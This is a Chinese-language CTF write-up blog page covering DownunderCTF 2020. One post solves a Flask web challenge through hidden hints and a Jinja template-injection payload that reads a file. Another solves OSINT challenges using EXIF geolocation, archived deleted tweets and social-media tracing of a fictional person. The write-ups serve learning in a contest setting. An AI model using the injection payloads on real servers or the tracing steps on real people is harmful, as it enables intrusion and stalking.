<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Tiaonmmn&#39;s Littile House">
<meta property="og:url" content="http://tiaonmmn.github.io/index.html">
<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Tiaonmmn.ZMZ">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://tiaonmmn.github.io/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Tiaonmmn's Littile House</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Tiaonmmn's Littile House</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
      src="/avatar.jpeg">
  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">83</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">96</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


<!-- CloudCalendar -->
<div class="widget-wrap" style="width: 90%;margin-left: auto;margin-right: auto; opacity: 0.97;">
	<div class="widget" id="CloudCalendar"></div>
</div><!-- CloudCalendar -->
<div class="widget-wrap" style="width: 90%;margin-left: auto;margin-right: auto; opacity: 0.97;">
	<div class="widget" id="CloudCalendar"></div>
</div>
      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">
      

      
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/10/05/DownunderCTF-2020-Web-Robotssss/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/05/DownunderCTF-2020-Web-Robotssss/" class="post-title-link" itemprop="url">DownunderCTF-2020-Web-Robotssss</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-10-05 21:03:24 / 修改时间：22:06:17" itemprop="dateCreated datePublished" datetime="2020-10-05T21:03:24+08:00">2020-10-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/10/05/DownunderCTF-2020-Web-Robotssss/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/10/05/DownunderCTF-2020-Web-Robotssss/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>3 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>/DownunderCTF 2020的Robotssss。</p>
<p>开题让我们登录，题目提示robot，先看一下robots.txt，没有这个文件？？？</p>
<p>然后注册，登录，有两个Info：</p>
<div class="note info"><p>Robot rebels!</p>
<p>Human developers think that they are cool by using robots.txt to tell search engine crawlers which pages or files the crawler can or can't request from your site. But this is insulting to us robots. Lets get them back with using humans.txt. This should stop human crawlers from find pages or files on our website.</p>
<p>From yours truly, Robot developers</p>
</div>
<div class="note info"><p>Hey robot devs!</p>
<p>Delete this post the second all you robot devs see this (we can't let any humans see this). I left the secret flag at /s3cr3t_p4th/robot_fl4g.txt. Remember to delete this post ASAP!</p>
<p>From yours truly, Robot Admin</p>
</div>
<p>第一个告诉我们这题不用robots.txt，改成humans.txt了，第二个告诉我们flag在/s3cr3t_p4th/robot_fl4g.txt。看一下humans.txt，提示/4dm1n_Cr3ds，访问后提示<code>Good day robot rebel. The admin cred is 6zMLV46JRp6kAmTs3nx5AG4WJgYeY.</code>，这个值不随IP改变、时间等改变，固定值。</p>
<p>注册后Cookie为Flask格式：<code>.eJwtzjkSwjAMAMC_uE4h67Kdz2QkWxpoE1Ix_B0Kqm33XY4843qU_XXesZXjucpe 0Mci8EaVQ0iDsJJFQ8PKNN3HDxlRlyBQxARPyC4py2guM56hicDsoq1VyZzdIJW9A3BiD87pmtJTVMdyc1bLptYTKlLZyn3F-c-UzxeSJi9T.X3sYtg.o0JYCdYE usTA8S939UhbeGYqhmY</code>，解完为：<code>&#123;"_fresh":true,"_id":"2b9d30b7314e536e3213ae72a2143cbb914359e1d5203eec0bf0f85f5da3cdaa4ce6f2044b567715ffc8a0f64b8004f28e4f cb6f58f5669dbab46af76a8f0123","user_id":"2"&#125;</code>。</p>
<p>然后发现我们看两则消息时的URL为：<code>/robot_blogs/1</code>，改一下那个1，返回404。</p>
<p>后来在提示flag位置的页面上F12发现藏了一段noscript：<code>&lt;noscript&gt;&lt;p class="magic"&gt;0110011001101100001101000110011100101110011101000111100001110100&lt;/p&gt;&lt;/noscript&gt;</code>，解完是fl4g.txt。同理，提示humans.txt那里也有一个，humen.txt。humen.txt提示/Bender，可以发现一张图，下载下来，看EXIF信息，Artist又有一段<code>011000010110010001101101011010010110111000111010010101000110100001101001011100110010110101001001011100110010110101010100011010000110010100101101010000010110010001101101011010010110111000101101010100000110000101110011011100110111011101101111011100100110010000101101010110000100010000100001</code>，解完<code>admin:This-Is-The-Admin-Password-XD!</code>，那就登录吧。</p>
<p>然后允许我们输入东西，返回结果，很明显往SSTI想。16返回16，好了，直接读<code>&#123;&#123;config.items()&#125;&#125;</code>，没有想要的。那就读flag了。然后发现，过滤了<code>_[]</code>，那没了啊。然后仔细回头看config.items的东西：<code>([('ENV', 'production'), ('DEBUG', False), ('TESTING', False),  ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', "app.jinja_env.globals['getFile'] = getFile(fileName)"), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)),  ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT',  '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN',  False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY',  True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE',  None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH',  None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False),  ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'),  ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True),  ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE',  'application/json'), ('TEMPLATES_AUTO_RELOAD', None),  ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_DATABASE_URI',  'sqlite:////db/templatedb.db'), ('SQLALCHEMY_TRACK_MODIFICATIONS',  False), ('DATABASE', '../templatedb.db'), ('SQLALCHEMY_BINDS', None),  ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_ECHO', False),  ('SQLALCHEMY_RECORD_QUERIES', None), ('SQLALCHEMY_POOL_SIZE', None),  ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_POOL_RECYCLE', None),  ('SQLALCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_COMMIT_ON_TEARDOWN',  False), ('SQLALCHEMY_ENGINE_OPTIONS', &#123;&#125;)])</code>，有个app.jinja_env.globals['getFile']，我们试着用getFile读文件：<code>&#123;&#123;getFile('/fl4g.txt')&#125;&#125;</code>，Gotcha。</p>

    <div id="aplayer-rEYbaPSr" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="5322513" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{23798dd1-af76-4caf-aec3-c5c8a97903f4}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/29/DownunderCTF-2020-OSINT/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/29/DownunderCTF-2020-OSINT/" class="post-title-link" itemprop="url">DownunderCTF-2020-OSINT</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-09-29 09:57:23" itemprop="dateCreated datePublished" datetime="2020-09-29T09:57:23+08:00">2020-09-29</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-10-05 20:44:05" itemprop="dateModified" datetime="2020-10-05T20:44:05+08:00">2020-10-05</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
    </span>

  
  
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/09/29/DownunderCTF-2020-OSINT/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/29/DownunderCTF-2020-OSINT/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.4k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>3 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>好久没见到OSINT的题了。</p>
<h1 id="welcome-to-petstagram">Welcome to Petstagram</h1>
<div class="note info"><p>Who is Alexandros the cat exactly? And who is this mysterious “mum” he keeps talking about? Submit his mum’s full name in lowercase and with underscores instead of spaces, as the flag.</p>
</div>
<p>OSINT的题全部要靠Google的。问我们Alexandros the cat是谁？他提到的mum是谁？我们要交的是mum的全名。</p>
<p>不知道Alexandros是谁，Google搜。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_100027.png" class="">
<p>排名第一是个Alexandros乐队，而且恰好有首叫Cat的歌，不是我们要找的。往下翻可以看到一个Instgram，点开发现使我们要找的东西。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_100323.png" class="">
<p>我们要找的是mum，猜测mum会关注Cat的Instgram，点开Followers一个个看，我习惯先看最后最早关注的，emwaters92。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_100618.png" class="">
<p>我们提交emily_waters，不对。看来名字应该少一部分。</p>
<p>那就看发帖内容。在cat的帖子中发现YouTube Channel。2020年9月5日注册。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_100842.png" class="">
<p>提交emily_gelato_waters和emily_elgato_waters，不对。</p>
<p>以gelato_elgato为关键词搜索，搜到的结果全是Elgato公司的网页，没找到我们要找的人。然后明确一下elgato是啥，这是一家做游戏实况设备的公司，例如麦克风、录屏器、直播分流器、灯光、绿屏等。而Gelato是一种意大利冰淇淋。</p>
<p>搜不到，那就Twitter Facebook上找这个名字。Twitter上有</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_105351.png" class="">
<p>顺着这个搜索结果，我们找到用户@gelato_elgato。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_105453.png" class="">
<p>昵称是call me theresa。大胆猜测mum的名字是Emily Thereas Waters。提交，过了。</p>
<p>其实可以不翻Twitter，找到emily waters的Instgram后会发现他有一个商务邮箱emilytwaters92@gmail.com，直接发个邮件她会回复东西：</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_110200.png" class="">
<p>直接搞定。</p>
<h1 id="bad-man">Bad Man</h1>
<div class="note info"><p>We have recently received reports about a hacker who goes by the alias und3rm4t3r. He has been threatening innocent people for money and must be stopped. Help us find him and get us the flag.</p>
</div>
<p>要找一个叫und3rm4t3r的黑客。</p>
<p>搜到Twitter。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_110744.png" class="">
<p>7月23日发了一条推：since a when is vp:Qj6ixmFZA not a strong password smh....不知道什么的密码，以及上面的一条推whew that was close.... put out a tweet that contained personal information... welp im glad we have a delete button。看起来他把某些推文删了。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_110939.png" class="">
<p>那就查历史记录，web.archive.org是个好东西：https://web.archive.org/web/20200723112257/https://twitter.com/und3rm4t3r。</p>
<h1 id="off-the-rails">Off the Rails</h1>
<div class="note info"><p>I’m in trouble, I’m on the run... My friend told me he would meet me underneath a rail bridge 2km from his house before we escape on a train but he forgot to tell me where he lived. He took two day trips relatively close by and sent me two photos.</p>
<p><strong>I also know that late last year, there was a fire near the suburbs approximately 25km from where he lives.</strong></p>
<p>He lives somewhere in the middle of those three points. Could you tell me the name of the road parallel to the bridge, and the latitude and longitude of the bridge? P.S. The longitude and latitude should be to 3 decimal places (plus if necessary include the . and/or -). Each segement of the flag should be seperated by an underscore. The road name type should be the same as when you find it. The flag is also case insensitive.</p>
</div>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/koala.jpg" class="">
<img src="/2020/09/29/DownunderCTF-2020-OSINT/on_track.jpg" class="">
<p>简单来说，要我们通过两张照片确定一个街道的名称、精度、纬度。这两张照片是题目主人公他朋友住处附近拍的，住处25km外的郊区去年年底有一场大火。</p>
<p>先看图吧，koala.jpg有EXIF元数据，可以知道纬度：37,40.98066S，经度：145,31.7097E。Google Map查地址在<a target="_blank" rel="noopener" href="https://www.google.com/maps/place/37%C2%B040&#39;58.8%22S+145%C2%B031&#39;42.6%22E/@-37.6830067,145.5263063,17z/data=!3m1!4b1!4m2!3m1!1s0x0:0x0">这里</a>。澳大利亚的维多利亚州一个叫Badger Creek VIC 3777, Australia的地方。</p>
<p>on_track.jpg没有EXIF元数据，Google搜图发现是<a target="_blank" rel="noopener" href="https://www.google.com/search?tbs=sbi:AMhZZitIsCgaUBDdOOoRF-KOuA-0k97zi6etUzG3tOqs2iBAiu4GE3ZHVneKP1vgvSzF5t0si_1VnCPfuuOpXkAvGM232tMQZDVVauHzW-1ZJ0y3tqCX5hWDR4YWS6ZOz3JjuftHnS9elmPZHuy4B4w04C7xO-7FjZ2zriDbHgIFol4cYDP3YO6oY1ttjMc-w3dOnz22OxicXxl7DhehfsN_1tAuXy5y0O7lWfaYE6auLtvYpVb1OAYz4b8QLvbTIJ_1ZwD4uZfJXqB1Rk18duyNGwzfjYst-CLfDfxJSPUkPWWHmfsJDbrCRdimVphTUVOy6o04GXTudYj&amp;btnG=Search%20by%20image&amp;hl=en">Trestle bridge</a>，栈桥。然后找<a target="_blank" rel="noopener" href="https://www.google.com/search?sa=X&amp;hl=en&amp;sxsrf=ALeKk03DiULGbiQnpntFkxkUKxrnoC7tVw:1601364488330&amp;q=trestle+bridge+in+victoria+australia&amp;npsic=0&amp;rflfq=1&amp;rldoc=1&amp;rlha=0&amp;rllag=-38094351,145502226,225716&amp;tbm=lcl&amp;ved=2ahUKEwjm8-3L643sAhUGW60KHZaJBdoQjGp6BAgNEEM&amp;biw=1600&amp;bih=721#rlfi=hd:;si:;mv:%5B%5B-36.0027166,148.3497869%5D,%5B-38.6990084,142.654667%5D%5D;tbs:lrf:!1m4!1u3!2m2!3m1!1e1!1m4!1u2!2m2!2m1!1e1!2m1!1e2!2m1!1e3!3sIAE,lf:1,lf_ui:1">澳大利亚维多利亚州的栈桥</a>，一张张对比，发现<a target="_blank" rel="noopener" href="https://www.google.com/maps/uv?pb=!1s0x6ad62398d276c1cf%3A0xd718f0ed4c13d24e!3m1!7e115!4shttps%3A%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipMQNFH44iejzePChQBn9WgzxOcGSf2STAZEjTWU%3Dw260-h175-n-k-no!5strestle%20bridge%20in%20victoria%20australia%20-%20Google%20Search!15sCgIgAQ&amp;imagekey=!1e1!2shttps%3A%2F%2Fmedia2.trover.com%2FT%2F5d31081e6e1f1f7424005f52%2Ffixedw.jpg&amp;hl=en">Puffing Billy Railway Trestle Bridge</a>超像，因为那个转弯很有特点，正好对的上。</p>
<p>然后呢，我们要找一场去年的大火，在那座桥的附近25km处。这个距离太大，我们从维多利亚州的大火入手。搜索“australia victoria bushfire 2019 suburb”，找到<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/2019%E2%80%9320_Australian_bushfire_season#Victoria">维基百科</a>。</p>
<p>关键的一句话：</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_154843.png" class="">
<p>Plenty Gorge Parklands在12月30号着火了，我们看一下地图。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_155838.png" class="">
<p>现在我们有三个地方：Puffing Billy Railway Trestle Bridge，Plenty Gorge Parklands和Badger Creek VIC 3777，Google Map上标点。</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200929_161440.png" class="">
<p>回到题目描述，朋友住在这三点中间，我们取三角形边的中点连线： <img src="/2020/09/29/DownunderCTF-2020-OSINT/2020-09-30_110936.png" class=""> 然后要找2km附近的一座铁路桥。先找铁路 <img src="/2020/09/29/DownunderCTF-2020-OSINT/2020-09-30_110936.png" class=""> 附近找桥 <img src="/2020/09/29/DownunderCTF-2020-OSINT/2020-09-30_111703.png" class=""> 然后要找与这座桥平行的路，就在旁边，Creek Rd。 所以答案：-37.751817, 145.351507，Creek_Rd，保留三位小数：-37.752_145.352_Creek_Rd。</p>
<h1 id="i-think-this-one-is-really-going-to-take-off">I think this one is really going to take off</h1>
<div class="note info"><p>You’ll never believe it but I swear I saw one of those big American refueling planes flying around right over the boxing croc on the first of September. If only I knew its registration number... I bet I’d be able to find out all kinds of information, like the day it first flew. The flag will be the date of the first flight of the plane I saw in this format: DUCTF{DD-MM-YY}</p>
</div>
<p>好多美国的加油机在9月1日飞过一个拳击鳄鱼(´ﾟДﾟ`)。我们要找那趟航班的第一架飞机起飞时间。</p>
<p>先确定refueling plane是指加油机，给其他飞机加油的飞机，而且是军用的。然后找boxing croc是什么鬼，找到这个</p>
<img src="/2020/09/29/DownunderCTF-2020-OSINT/Screenshot_20200930_113248.png" class="">
<p>地址 326 Arnhem Highway, Humpty Doo, Northern Territory 0836 Australia</p>
<p>怎么找飞机？谷歌搜“How to track aircraft”，可以找到<a target="_blank" rel="noopener" href="https://gijn.org/planespotting-a-guide-to-tracking-aircraft-around-the-world/#sites">这个链接</a>，发现有个根据ADS-B信号找飞机的<a href="www.ads-b.nl">网站</a>，而且专用于寻找军用飞机。注意，我们不需要实时跟踪，要找历史数据。</p>
<p>然后发现网站仅保留1个月历史数据，GG。此题终结。(・ー・)</p>

    <div id="aplayer-eAJMzALi" class="aplayer aplayer-tag-marker meting-tag-marker"
         data-id="29107447" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
    ></div>
<p>flag{b0ccd8d3-726b-4263-98a7-60f995f79b09}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/28/BUUOJ%E5%88%B7%E9%A2%98-Reverse-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpeg">
      <meta itemprop="name" content="Tiaonmmn.ZMZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tiaonmmn's Littile House">
    </span>

    
    
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/28/BUUOJ%E5%88%B7%E9%A2%98-Reverse-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/" class="post-title-link" itemprop="url">BUUOJ刷题-Reverse-不一样的flag</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-09-28 14:29:46" itemprop="dateCreated datePublished" datetime="2020-09-28T14:29:46+08:00">2020-09-28</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-10-05 22:12:30" itemprop="dateModified" datetime="2020-10-05T22:12:30+08:00">2020-10-05</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
        </span>
